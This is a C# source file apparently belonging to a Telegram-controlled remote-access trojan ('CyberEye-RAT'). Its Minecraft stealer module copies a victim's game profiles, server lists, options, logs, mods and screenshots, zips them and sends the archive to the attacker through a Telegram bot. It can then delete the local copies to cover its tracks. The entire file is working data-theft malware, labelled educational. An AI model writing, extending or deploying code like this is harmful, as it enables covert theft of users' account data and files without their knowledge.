/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace TelegramRAT.modded.stealer
{
    internal class Minecraft
    {
        private static readonly string MinecraftPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");

        // Get installed versions
        private static void SaveVersions(string sSavePath)
        {
            try
            {
                foreach (var version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
                {
                    var name = new DirectoryInfo(version).Name;
                    var size = DirectorySize(version) + " bytes";
                    var date = Directory.GetCreationTime(version)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\versions.txt",
                        $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect installed versions\n" + ex);
            }
        }

        // Get installed mods
        private static void SaveMods(string sSavePath)
        {
            try
            {
                foreach (var mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
                {
                    var name = Path.GetFileName(mod);
                    var size = new FileInfo(mod).Length + " bytes";
                    var date = File.GetCreationTime(mod)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect installed mods\n" + ex);
            }
        }

        // Get screenshots
        private static void SaveScreenshots(string sSavePath)
        {
            try
            {
                var screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
                if (screenshots.Length == 0) return;

                Directory.CreateDirectory(sSavePath + "\\screenshots");
                foreach (var screenshot in screenshots)
                    File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect screenshots\n" + ex);
            }
        }

        // Get profile & options & servers files 
        private static void SaveFiles(string sSavePath)
        {
            try
            {
                var files = Directory.GetFiles(MinecraftPath);
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    var sFile = fileInfo.Name.ToLower();
                    if (sFile.Contains("profile") || sFile.Contains("options") || sFile.Contains("servers"))
                        fileInfo.CopyTo(Path.Combine(sSavePath, fileInfo.Name));
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect profiles\n" + ex);
            }
        }

        // Get logs
        private static void SaveLogs(string sSavePath)
        {
            try
            {
                var logdir = Path.Combine(MinecraftPath, "logs");
                var savedir = Path.Combine(sSavePath, "logs");
                if (!Directory.Exists(logdir)) return;
                Directory.CreateDirectory(savedir);
                var files = Directory.GetFiles(logdir);
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    if (fileInfo.Length >= config.GrabFileSize) continue;
                    var to = Path.Combine(savedir, fileInfo.Name);
                    if (!File.Exists(to))
                        fileInfo.CopyTo(to);
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect logs\n" + ex);
            }
        }
        public static long DirectorySize(string path)
        {
            var dir = new DirectoryInfo(path);
            return dir.GetFiles().Sum(fi => fi.Length) +
                   dir.GetDirectories().Sum(di => DirectorySize(di.FullName));
        }
        // Run minecraft data stealer
        public static void SaveAll(bool SaveScreenshotsB, bool CleanFolderAfterCollectingB)
        {
            string dirPath = Path.GetDirectoryName(config.InstallPath) + "\\Minecraft";
            if (!Directory.Exists(MinecraftPath)) return;

            try
            {
                Directory.CreateDirectory(dirPath);
                SaveMods(dirPath);
                SaveFiles(dirPath);
                SaveVersions(dirPath);
                SaveLogs(dirPath);
                if (SaveScreenshotsB)
                    SaveScreenshots(dirPath);
                if (Directory.Exists(dirPath + ".zip"))
                    File.Delete(dirPath + ".zip");
                ZipFile.CreateFromDirectory(dirPath, dirPath + ".zip");
                telegram.sendFile(dirPath + ".zip");
                if (CleanFolderAfterCollectingB)
                {
                    File.Delete(dirPath + ".zip");
                    Directory.Delete(dirPath, true);
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("Minecraft >> Failed collect data\n" + ex);
            }
        }
    }
}
